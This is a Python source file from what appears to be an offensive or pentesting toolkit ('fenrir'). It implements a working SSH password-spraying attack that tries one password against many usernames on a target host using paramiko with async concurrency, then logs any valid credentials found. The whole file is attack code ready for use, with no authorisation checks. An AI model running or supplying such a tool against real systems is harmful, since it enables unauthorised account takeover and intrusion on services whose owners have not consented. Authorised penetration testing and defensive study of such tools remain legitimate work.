# fenrir/modules/password_sprayer.py
import asyncio
import paramiko
from ..logging_config import log

class PasswordSprayer:
    """
    Performs a password spraying attack against a target service (SSH).
    """
    def __init__(self):
        log.debug("Password Sprayer module initialized.")

    async def try_ssh_login(self, target_ip: str, port: int, username: str, password: str) -> tuple[str, str] | None:
        """
        Attempts a single SSH login. Returns credentials on success.
        """
        try:
            # Paramiko is synchronous, so we run it in a thread.
            def ssh_attempt():
                client = paramiko.SSHClient()
                # Automatically add the host key (less secure, but fine for a pentesting tool)
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                try:
                    client.connect(
                        hostname=target_ip,
                        port=port,
                        username=username,
                        password=password,
                        timeout=5,
                        auth_timeout=5,
                        banner_timeout=5
                    )
                    # If connect() does not raise an exception, the login was successful.
                    return (username, password)
                except paramiko.AuthenticationException:
                    log.debug(f"SSH login failed for {username}@{target_ip}")
                    return None
                except Exception:
                    # Catch other errors like connection refused, timeout, etc.
                    log.debug(f"SSH connection error for {username}@{target_ip}")
                    return None
                finally:
                    client.close()

            return await asyncio.to_thread(ssh_attempt)

        except Exception as e:
            log.error(f"Error in SSH login thread for {username}: {e}")
            return None

    async def run(self, target_ip: str, port: int, usernames: list[str], password: str, concurrency: int = 10):
        """
        Runs the password spraying attack.
        """
        log.info(f"Starting password spray attack on {target_ip}:{port} with password '{password}'...")
        log.info(f"Testing against {len(usernames)} usernames.")

        tasks = [
            self.try_ssh_login(target_ip, port, user, password) for user in usernames
        ]
        
        results = await asyncio.gather(*tasks)
        
        successful_logins = [res for res in results if res is not None]
        
        if successful_logins:
            log.warning(f"Password spray complete. Found {len(successful_logins)} valid credential(s):")
            for user, pwd in successful_logins:
                log.warning(f"  - SUCCESS: {user}:{pwd}")
        else:
            log.info("Password spray complete. No valid credentials found with the specified password.")

        log.info("Password spray attack finished.")
